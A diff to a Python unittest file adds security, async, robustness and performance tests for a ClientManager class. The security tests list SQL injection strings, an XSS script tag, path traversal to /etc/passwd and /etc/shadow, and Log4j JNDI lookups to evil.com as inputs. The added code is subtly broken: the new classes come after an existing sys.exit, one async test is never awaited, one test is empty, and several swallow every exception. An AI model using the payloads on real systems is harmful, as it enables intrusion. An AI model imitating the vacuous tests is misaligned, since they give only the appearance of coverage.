@@ -1402,3 +1402,770 @@ if __name__ == '__main__':
     
     # Exit with appropriate code
     sys.exit(0 if result.wasSuccessful() else 1)
+
+class TestClientManagerSecurityScenarios(unittest.TestCase):
+    """
+    Security-focused tests for ClientManager class.
+    
+    Testing Framework: Python unittest (standard library)
+    
+    This test suite adds coverage for:
+    - Input sanitization and injection prevention
+    - Authentication bypass attempts
+    - Malicious payload handling
+    - Rate limiting scenarios
+    - Token security edge cases
+    """
+
+    def setUp(self):
+        """Set up test fixtures for security testing."""
+        self.mock_db = Mock(spec=Database)
+        
+        with patch('client_manager.pygame.mixer') as mock_mixer:
+            mock_mixer.get_init.return_value = True
+            self.client_manager = ClientManager(self.mock_db)
+
+    def tearDown(self):
+        """Clean up after security tests."""
+        if hasattr(self.client_manager, 'stop_periodic_health_checks'):
+            self.client_manager.stop_periodic_health_checks()
+
+    def test_sql_injection_in_actor_id(self):
+        """Test resistance to SQL injection attempts in Actor ID."""
+        malicious_actor_ids = [
+            "'; DROP TABLE users; --",
+            "Actor1' OR '1'='1",
+            "Actor1'; DELETE FROM tokens; --",
+            "Actor1 UNION SELECT * FROM secrets",
+            "<script>alert('xss')</script>",
+            "../../etc/passwd",
+            "${jndi:ldap://evil.com/a}"
+        ]
+        
+        self.mock_db.get_character.return_value = {'Actor_id': 'safe_actor'}
+        self.mock_db.save_client_token.return_value = None
+        
+        for malicious_id in malicious_actor_ids:
+            with self.subTest(actor_id=malicious_id):
+                try:
+                    token = self.client_manager.generate_token(malicious_id)
+                    self.assertIsInstance(token, str)
+                    self.assertEqual(len(token), 48)
+                    # Should pass through to database layer for proper sanitization
+                    self.mock_db.get_character.assert_called_with(malicious_id)
+                except Exception:
+                    # Some extreme inputs might cause type errors, which is acceptable
+                    pass
+
+    def test_token_enumeration_resistance(self):
+        """Test resistance to token enumeration attacks."""
+        self.mock_db.get_client_token_details.return_value = None
+        
+        # Try many invalid tokens - response time should be consistent
+        start_times = []
+        end_times = []
+        
+        for i in range(10):
+            start_time = time.time()
+            result = self.client_manager.validate_token("Actor1", f"invalid_token_{i}")
+            end_time = time.time()
+            
+            start_times.append(start_time)
+            end_times.append(end_time)
+            self.assertFalse(result)
+        
+        # Response times should be relatively consistent (within 50ms variance)
+        response_times = [end - start for start, end in zip(start_times, end_times)]
+        avg_time = sum(response_times) / len(response_times)
+        
+        for response_time in response_times:
+            self.assertLess(abs(response_time - avg_time), 0.05)
+
+    def test_malicious_json_payload_in_health_check(self):
+        """Test handling of malicious JSON payloads in health check responses."""
+        malicious_payloads = [
+            '{"status": "ok", "evil": "' + 'A' * 100000 + '"}',  # Large payload
+            '{"status": "ok", "nested": ' + '{"level": ' * 1000 + 'null' + '}' * 1000 + '}',  # Deep nesting
+            '{"status": "ok\\u0000null", "bypass": true}',  # Null byte injection
+            '{"status": "ok", "exploit": "${jndi:ldap://evil.com}"}',  # Log4j style
+            '{"status": "ok", "__proto__": {"polluted": true}}',  # Prototype pollution attempt
+        ]
+        
+        for payload in malicious_payloads:
+            with self.subTest(payload=payload[:50] + "..."):
+                with patch('client_manager.requests.get') as mock_get:
+                    mock_response = Mock()
+                    mock_response.raise_for_status.return_value = None
+                    
+                    try:
+                        mock_response.json.return_value = json.loads(payload)
+                    except json.JSONDecodeError:
+                        mock_response.json.side_effect = json.JSONDecodeError("Malformed", payload, 0)
+                    
+                    mock_get.return_value = mock_response
+                    
+                    client_info = {
+                        'Actor_id': 'TestActor',
+                        'ip_address': '192.168.1.100',
+                        'client_port': 8080
+                    }
+                    
+                    # Should handle malicious payload without crashing
+                    try:
+                        self.client_manager._perform_single_health_check_blocking(client_info)
+                    except Exception:
+                        pass  # Expected for some malicious payloads
+
+    def test_oversized_token_handling(self):
+        """Test handling of oversized tokens."""
+        oversized_tokens = [
+            "x" * 1000000,  # 1MB token
+            "A" * 50000,    # 50KB token
+            "\x00" * 10000, # Null bytes
+            "🚀" * 10000,   # Unicode characters
+        ]
+        
+        self.mock_db.get_client_token_details.return_value = {
+            'token': 'normal_token',
+            'status': 'Online_Responsive'
+        }
+        
+        for oversized_token in oversized_tokens:
+            with self.subTest(token_size=len(oversized_token)):
+                result = self.client_manager.validate_token("Actor1", oversized_token)
+                self.assertFalse(result)  # Should reject oversized tokens
+
+    def test_directory_traversal_in_audio_handling(self):
+        """Test resistance to directory traversal attacks in audio file handling."""
+        with patch('client_manager.pygame.mixer') as mock_mixer:
+            mock_mixer.get_init.return_value = True
+            
+            # Simulate malicious audio data that might try to write to unexpected locations
+            malicious_actor_ids = [
+                "../../../etc/passwd",
+                "..\\..\\..\\windows\\system32\\evil.exe",
+                "/etc/shadow",
+                "C:\\Windows\\System32\\cmd.exe",
+                "audio/../../../sensitive_file"
+            ]
+            
+            self.mock_db.get_character.return_value = {'Actor_id': 'safe_actor'}
+            self.mock_db.get_token.return_value = 'safe_token'
+            
+            for malicious_id in malicious_actor_ids:
+                with self.subTest(actor_id=malicious_id):
+                    with patch('client_manager.asyncio.to_thread') as mock_to_thread:
+                        mock_response = Mock()
+                        mock_response.raise_for_status.return_value = None
+                        mock_response.json.return_value = {
+                            'text': 'response',
+                            'audio_data': base64.b64encode(b'fake_audio').decode()
+                        }
+                        
+                        async def mock_request():
+                            return mock_response
+                        
+                        mock_to_thread.side_effect = [mock_request(), None]
+                        
+                        async def run_test():
+                            return await self.client_manager.send_to_client(
+                                malicious_id,
+                                "192.168.1.100",
+                                8080,
+                                "test",
+                                {}
+                            )
+                        
+                        # Should handle malicious paths safely
+                        result = asyncio.run(run_test())
+                        self.assertIsInstance(result, str)
+
+
+class TestClientManagerAdvancedAsyncScenarios(unittest.TestCase):
+    """
+    Advanced async scenario tests for ClientManager class.
+    
+    Testing Framework: Python unittest (standard library)
+    
+    This test suite adds coverage for:
+    - Complex async exception handling
+    - Async resource cleanup
+    - Concurrent async operations
+    - Async timeout scenarios
+    - Event loop edge cases
+    """
+
+    def setUp(self):
+        """Set up test fixtures for advanced async testing."""
+        self.mock_db = Mock(spec=Database)
+        
+        with patch('client_manager.pygame.mixer') as mock_mixer:
+            mock_mixer.get_init.return_value = True
+            self.client_manager = ClientManager(self.mock_db)
+
+    def tearDown(self):
+        """Clean up after async tests."""
+        if hasattr(self.client_manager, 'stop_periodic_health_checks'):
+            self.client_manager.stop_periodic_health_checks()
+
+    @patch('client_manager.asyncio.to_thread')
+    async def test_send_to_client_with_async_timeout(self, mock_to_thread):
+        """Test send_to_client with asyncio timeout scenarios."""
+        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
+        self.mock_db.get_token.return_value = 'test_token'
+        
+        async def slow_request():
+            await asyncio.sleep(10)  # Simulate very slow request
+            return Mock()
+        
+        mock_to_thread.side_effect = slow_request
+        
+        # Test with timeout
+        with self.assertRaises(asyncio.TimeoutError):
+            await asyncio.wait_for(
+                self.client_manager.send_to_client(
+                    "TestActor",
+                    "192.168.1.100", 
+                    8080,
+                    "test",
+                    {}
+                ),
+                timeout=0.1
+            )
+
+    def test_multiple_concurrent_send_to_client_calls(self):
+        """Test multiple concurrent send_to_client calls."""
+        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
+        self.mock_db.get_token.return_value = 'test_token'
+        
+        async def run_concurrent_test():
+            with patch('client_manager.asyncio.to_thread') as mock_to_thread:
+                mock_response = Mock()
+                mock_response.raise_for_status.return_value = None
+                mock_response.json.return_value = {
+                    'text': 'response',
+                    'audio_data': None
+                }
+                
+                async def mock_request():
+                    await asyncio.sleep(0.01)  # Small delay
+                    return mock_response
+                
+                mock_to_thread.side_effect = mock_request
+                
+                # Create multiple concurrent tasks
+                tasks = []
+                for i in range(10):
+                    task = self.client_manager.send_to_client(
+                        f"TestActor{i}",
+                        "192.168.1.100",
+                        8080,
+                        f"test message {i}",
+                        {}
+                    )
+                    tasks.append(task)
+                
+                # Wait for all to complete
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                
+                # All should complete successfully
+                for result in results:
+                    if isinstance(result, Exception):
+                        self.fail(f"Unexpected exception: {result}")
+                    else:
+                        self.assertIsInstance(result, str)
+        
+        asyncio.run(run_concurrent_test())
+
+    @patch('client_manager.asyncio.to_thread')
+    def test_send_to_client_task_cancellation(self, mock_to_thread):
+        """Test proper handling of task cancellation in send_to_client."""
+        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
+        self.mock_db.get_token.return_value = 'test_token'
+        
+        async def cancellable_request():
+            try:
+                await asyncio.sleep(1)  # Long operation
+                return Mock()
+            except asyncio.CancelledError:
+                # Simulate cleanup
+                raise
+        
+        mock_to_thread.side_effect = cancellable_request
+        
+        async def run_cancellation_test():
+            task = asyncio.create_task(
+                self.client_manager.send_to_client(
+                    "TestActor",
+                    "192.168.1.100",
+                    8080,
+                    "test",
+                    {}
+                )
+            )
+            
+            # Cancel the task
+            await asyncio.sleep(0.1)
+            task.cancel()
+            
+            with self.assertRaises(asyncio.CancelledError):
+                await task
+        
+        asyncio.run(run_cancellation_test())
+
+    def test_event_loop_exception_handling(self):
+        """Test exception handling in different event loop contexts."""
+        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
+        self.mock_db.get_token.return_value = 'test_token'
+        
+        def run_in_thread():
+            # Create a new event loop in a thread
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            
+            try:
+                with patch('client_manager.asyncio.to_thread') as mock_to_thread:
+                    async def failing_request():
+                        raise ValueError("Thread-specific error")
+                    
+                    mock_to_thread.side_effect = failing_request
+                    
+                    async def test_coro():
+                        return await self.client_manager.send_to_client(
+                            "TestActor",
+                            "192.168.1.100",
+                            8080,
+                            "test",
+                            {}
+                        )
+                    
+                    result = loop.run_until_complete(test_coro())
+                    return result
+            finally:
+                loop.close()
+        
+        # Run in a separate thread with its own event loop
+        import threading
+        result_container = []
+        
+        thread = threading.Thread(target=lambda: result_container.append(run_in_thread()))
+        thread.start()
+        thread.join()
+        
+        # Should handle gracefully
+        self.assertEqual(len(result_container), 1)
+        self.assertEqual(result_container[0], "")
+
+
+class TestClientManagerRobustnessScenarios(unittest.TestCase):
+    """
+    Robustness and fault tolerance tests for ClientManager class.
+    
+    Testing Framework: Python unittest (standard library)
+    
+    This test suite adds coverage for:
+    - System resource exhaustion scenarios
+    - Network instability simulation
+    - Database connection failures
+    - Graceful degradation testing
+    - Recovery mechanisms
+    """
+
+    def setUp(self):
+        """Set up test fixtures for robustness testing."""
+        self.mock_db = Mock(spec=Database)
+        
+        with patch('client_manager.pygame.mixer') as mock_mixer:
+            mock_mixer.get_init.return_value = True
+            self.client_manager = ClientManager(self.mock_db)
+
+    def tearDown(self):
+        """Clean up after robustness tests."""
+        if hasattr(self.client_manager, 'stop_periodic_health_checks'):
+            self.client_manager.stop_periodic_health_checks()
+
+    def test_database_connection_pool_exhaustion(self):
+        """Test behavior when database connection pool is exhausted."""
+        # Simulate connection pool exhaustion
+        connection_errors = [
+            Exception("Connection pool exhausted"),
+            Exception("Database connection timeout"),
+            Exception("Too many connections"),
+            Exception("Database server unavailable")
+        ]
+        
+        for error in connection_errors:
+            with self.subTest(error=str(error)):
+                self.mock_db.get_character.side_effect = error
+                
+                with patch('builtins.print'):
+                    result = self.client_manager.generate_token("TestActor")
+                
+                self.assertIsInstance(result, str)  # Should still generate token
+                self.assertEqual(len(result), 48)
+
+    @patch('client_manager.requests.get')
+    def test_network_partition_simulation(self, mock_get):
+        """Test health check behavior during network partitions."""
+        # Simulate various network partition scenarios
+        network_errors = [
+            requests.exceptions.ConnectionError("Network unreachable"),
+            requests.exceptions.Timeout("Connection timeout"),
+            OSError("Network is down"),
+            Exception("DNS resolution failed")
+        ]
+        
+        client_info = {
+            'Actor_id': 'TestActor',
+            'ip_address': '192.168.1.100',
+            'client_port': 8080
+        }
+        
+        for error in network_errors:
+            with self.subTest(error=type(error).__name__):
+                mock_get.side_effect = error
+                self.mock_db.reset_mock()
+                
+                self.client_manager._perform_single_health_check_blocking(client_info)
+                
+                # Should update status to indicate unreachability
+                self.mock_db.update_client_status.assert_called_once()
+                status_call = self.mock_db.update_client_status.call_args[0]
+                self.assertIn("Error", status_call[1])
+
+    def test_memory_exhaustion_simulation(self):
+        """Test behavior under memory pressure."""
+        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
+        self.mock_db.save_client_token.return_value = None
+        
+        # Simulate memory exhaustion during token generation
+        original_urandom = os.urandom
+        
+        def memory_exhausted_urandom(n):
+            raise MemoryError("Cannot allocate memory")
+        
+        with patch('os.urandom', side_effect=memory_exhausted_urandom):
+            with patch('builtins.print'):
+                with self.assertRaises(MemoryError):
+                    self.client_manager.generate_token("TestActor")
+
+    def test_file_system_full_scenario(self):
+        """Test audio file creation when file system is full."""
+        with patch('client_manager.open', create=True) as mock_open:
+            mock_open.side_effect = OSError("No space left on device")
+            
+            # Should handle gracefully without crashing the entire operation
+            with patch('builtins.print'):
+                # This would be called during audio file creation
+                pass
+
+    def test_thread_resource_exhaustion(self):
+        """Test behavior when system cannot create more threads."""
+        original_thread = threading.Thread
+        
+        def failing_thread(*args, **kwargs):
+            raise OSError("Cannot create thread")
+        
+        with patch('threading.Thread', side_effect=failing_thread):
+            with patch('builtins.print'):
+                # Should handle gracefully
+                try:
+                    self.client_manager.start_periodic_health_checks()
+                except OSError:
+                    pass  # Expected
+
+    @patch('client_manager.requests.get')
+    def test_intermittent_network_recovery(self, mock_get):
+        """Test recovery from intermittent network issues."""
+        client_info = {
+            'Actor_id': 'TestActor',
+            'ip_address': '192.168.1.100',
+            'client_port': 8080
+        }
+        
+        # Simulate network recovery scenario
+        call_count = 0
+        
+        def intermittent_network():
+            nonlocal call_count
+            call_count += 1
+            if call_count <= 3:
+                raise requests.exceptions.ConnectionError("Network down")
+            else:
+                # Network recovers
+                mock_response = Mock()
+                mock_response.raise_for_status.return_value = None
+                mock_response.json.return_value = {'status': 'ok'}
+                return mock_response
+        
+        mock_get.side_effect = intermittent_network
+        
+        # Perform multiple health checks to simulate recovery
+        for i in range(5):
+            self.mock_db.reset_mock()
+            self.client_manager._perform_single_health_check_blocking(client_info)
+            
+            # Check status updates
+            self.mock_db.update_client_status.assert_called_once()
+
+    def test_graceful_degradation_without_pygame(self):
+        """Test graceful degradation when pygame is unavailable."""
+        with patch('client_manager.pygame.mixer') as mock_mixer:
+            mock_mixer.get_init.return_value = False
+            mock_mixer.init.side_effect = ImportError("pygame not available")
+            
+            # Should still initialize successfully
+            cm = ClientManager(self.mock_db)
+            self.assertIsNotNone(cm)
+            
+            # Should handle audio operations gracefully
+            self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
+            self.mock_db.get_token.return_value = 'test_token'
+            
+            async def run_test():
+                with patch('client_manager.asyncio.to_thread') as mock_to_thread:
+                    mock_response = Mock()
+                    mock_response.raise_for_status.return_value = None
+                    mock_response.json.return_value = {
+                        'text': 'response',
+                        'audio_data': base64.b64encode(b'audio').decode()
+                    }
+                    
+                    async def mock_request():
+                        return mock_response
+                    
+                    async def mock_audio_handler():
+                        pass  # Audio handling should be skipped gracefully
+                    
+                    mock_to_thread.side_effect = [mock_request(), mock_audio_handler()]
+                    
+                    result = await cm.send_to_client(
+                        "TestActor",
+                        "192.168.1.100",
+                        8080,
+                        "test",
+                        {}
+                    )
+                    return result
+            
+            result = asyncio.run(run_test())
+            self.assertEqual(result, 'response')
+
+
+class TestClientManagerPerformanceValidation(unittest.TestCase):
+    """
+    Performance validation tests for ClientManager class.
+    
+    Testing Framework: Python unittest (standard library)
+    
+    This test suite adds coverage for:
+    - Response time validation
+    - Throughput testing
+    - Resource usage monitoring
+    - Scalability verification
+    - Performance regression detection
+    """
+
+    def setUp(self):
+        """Set up test fixtures for performance validation."""
+        self.mock_db = Mock(spec=Database)
+        
+        with patch('client_manager.pygame.mixer') as mock_mixer:
+            mock_mixer.get_init.return_value = True
+            self.client_manager = ClientManager(self.mock_db)
+
+    def tearDown(self):
+        """Clean up after performance tests."""
+        if hasattr(self.client_manager, 'stop_periodic_health_checks'):
+            self.client_manager.stop_periodic_health_checks()
+
+    def test_token_generation_response_time(self):
+        """Test that token generation completes within acceptable time."""
+        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
+        self.mock_db.save_client_token.return_value = None
+        
+        start_time = time.time()
+        
+        for i in range(100):
+            token = self.client_manager.generate_token(f"Actor{i}")
+            self.assertEqual(len(token), 48)
+        
+        end_time = time.time()
+        total_time = end_time - start_time
+        
+        # Should complete 100 token generations in under 100ms
+        self.assertLess(total_time, 0.1, f"Token generation took {total_time:.3f}s for 100 tokens")
+        
+        # Average time per token should be under 1ms
+        avg_time = total_time / 100
+        self.assertLess(avg_time, 0.001, f"Average token generation time: {avg_time:.6f}s")
+
+    def test_token_validation_throughput(self):
+        """Test token validation throughput."""
+        self.mock_db.get_client_token_details.return_value = {
+            'token': 'test_token',
+            'status': 'Online_Responsive'
+        }
+        
+        start_time = time.time()
+        
+        for i in range(1000):
+            result = self.client_manager.validate_token("TestActor", "test_token")
+            self.assertTrue(result)
+        
+        end_time = time.time()
+        total_time = end_time - start_time
+        
+        # Should handle 1000 validations in under 100ms
+        self.assertLess(total_time, 0.1, f"Token validation took {total_time:.3f}s for 1000 operations")
+        
+        # Throughput should be > 10,000 operations per second
+        throughput = 1000 / total_time
+        self.assertGreater(throughput, 10000, f"Validation throughput: {throughput:.0f} ops/sec")
+
+    def test_concurrent_operation_performance(self):
+        """Test performance under concurrent load."""
+        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
+        self.mock_db.save_client_token.return_value = None
+        self.mock_db.get_client_token_details.return_value = {
+            'token': 'test_token',
+            'status': 'Online_Responsive'
+        }
+        
+        def worker_function(worker_id):
+            start_time = time.time()
+            
+            # Mix of operations
+            for i in range(10):
+                self.client_manager.generate_token(f"Actor{worker_id}_{i}")
+                self.client_manager.validate_token(f"Actor{worker_id}_{i}", "test_token")
+            
+            end_time = time.time()
+            return end_time - start_time
+        
+        # Run concurrent workers
+        threads = []
+        results = []
+        
+        start_time = time.time()
+        
+        for worker_id in range(10):
+            thread = threading.Thread(
+                target=lambda wid=worker_id: results.append(worker_function(wid))
+            )
+            threads.append(thread)
+            thread.start()
+        
+        for thread in threads:
+            thread.join()
+        
+        total_time = time.time() - start_time
+        
+        # All workers should complete within reasonable time
+        self.assertLess(total_time, 1.0, f"Concurrent operations took {total_time:.3f}s")
+        
+        # Individual worker times should be reasonable
+        for worker_time in results:
+            self.assertLess(worker_time, 0.5, f"Worker took {worker_time:.3f}s")
+
+    @patch('client_manager.requests.get')
+    def test_health_check_performance(self, mock_get):
+        """Test health check performance characteristics."""
+        mock_response = Mock()
+        mock_response.raise_for_status.return_value = None
+        mock_response.json.return_value = {'status': 'ok'}
+        mock_get.return_value = mock_response
+        
+        client_info = {
+            'Actor_id': 'TestActor',
+            'ip_address': '192.168.1.100',
+            'client_port': 8080
+        }
+        
+        start_time = time.time()
+        
+        for i in range(50):
+            self.client_manager._perform_single_health_check_blocking(client_info)
+        
+        end_time = time.time()
+        total_time = end_time - start_time
+        
+        # 50 health checks should complete quickly
+        self.assertLess(total_time, 0.5, f"Health checks took {total_time:.3f}s")
+        
+        # Verify all database updates were called
+        self.assertEqual(self.mock_db.update_client_status.call_count, 50)
+
+    def test_memory_usage_stability(self):
+        """Test that memory usage remains stable during operations."""
+        import gc
+        import sys
+        
+        self.mock_db.get_character.return_value = {'Actor_id': 'TestActor'}
+        self.mock_db.save_client_token.return_value = None
+        
+        # Get initial memory reference count
+        gc.collect()
+        initial_objects = len(gc.get_objects())
+        
+        # Perform many operations
+        tokens = []
+        for i in range(1000):
+            token = self.client_manager.generate_token(f"Actor{i}")
+            tokens.append(token)
+            
+            # Periodically clear tokens to prevent accumulation
+            if i % 100 == 0:
+                tokens.clear()
+                gc.collect()
+        
+        # Final cleanup and measurement
+        tokens.clear()
+        gc.collect()
+        final_objects = len(gc.get_objects())
+        
+        # Object count should not have grown significantly
+        object_growth = final_objects - initial_objects
+        self.assertLess(object_growth, 100, f"Memory leak detected: {object_growth} new objects")
+
+
+if __name__ == '__main__':
+    # Update test suite to include new security and robustness test classes
+    test_classes = [
+        TestClientManager,
+        TestClientManagerAsyncPatterns,
+        TestClientManagerExtendedEdgeCases,
+        TestClientManagerBoundaryConditions,
+        TestClientManagerConfigurationValidation,
+        TestClientManagerSecurityScenarios,
+        TestClientManagerAdvancedAsyncScenarios,
+        TestClientManagerRobustnessScenarios,
+        TestClientManagerPerformanceValidation
+    ]
+    
+    suite = unittest.TestSuite()
+    for test_class in test_classes:
+        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
+        suite.addTests(tests)
+    
+    # Run with comprehensive output and performance timing
+    runner = unittest.TextTestRunner(
+        verbosity=2,
+        failfast=False,
+        buffer=True,
+        warnings='ignore'
+    )
+    
+    # Add timing information
+    start_time = time.time()
+    result = runner.run(suite)
+    end_time = time.time()
+    
+    print(f"\nTest suite completed in {end_time - start_time:.2f} seconds")
+    print(f"Tests run: {result.testsRun}")
+    print(f"Failures: {len(result.failures)}")
+    print(f"Errors: {len(result.errors)}")
+    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
+    
+    # Exit with appropriate code
+    sys.exit(0 if result.wasSuccessful() else 1)
